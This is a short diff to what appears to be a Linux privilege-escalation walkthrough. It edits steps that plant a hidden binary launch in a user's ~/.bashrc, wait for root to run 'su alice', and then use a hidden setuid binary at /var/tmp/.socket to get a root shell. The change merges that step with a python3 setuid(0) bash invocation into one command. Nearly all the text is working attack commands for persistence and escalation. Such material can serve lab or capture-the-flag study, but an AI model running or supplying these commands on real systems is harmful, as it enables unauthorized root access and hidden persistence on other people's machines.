@@ -17,11 +17,7 @@ echo "$(head -n1 ~/.bashrc)"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tai
 
 Wait for ROOT to execute 'su alice' and thereafter gain root with:
 ```
-/var/tmp/.socket -p
-```
-
-```
-python3 -c "import os;os.setuid(0);os.execl('/bin/bash', '-bash')"
+/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.execl('/bin/bash', '-bash')\""
 ```
 ---
 
